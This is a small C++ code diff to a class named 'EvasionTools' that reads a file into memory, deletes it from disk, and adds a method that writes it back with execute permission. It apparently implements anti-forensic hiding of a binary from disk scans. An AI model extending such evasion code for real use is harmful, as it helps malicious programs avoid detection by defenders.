@@ -36,12 +36,20 @@ class EvasionTools{
 
 			tmpc=(char*)malloc(Current.size);
 			read(fd, tmpc, Current.size);
-
+			close(fd);
 			if (remove(Current.name))
 				return 1;
 			return 0;
 		}
 		int MoveBackToDisk(const char* loc=Current.name){
+			fd=open(loc, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IXUSR);
+
+			if (fd == -1 || tmpc == NULL)
+				return 1;
+
+			write(fd, tmpc, Current.size);
+			close(fd);
+
 			return 0;
 		}
 };
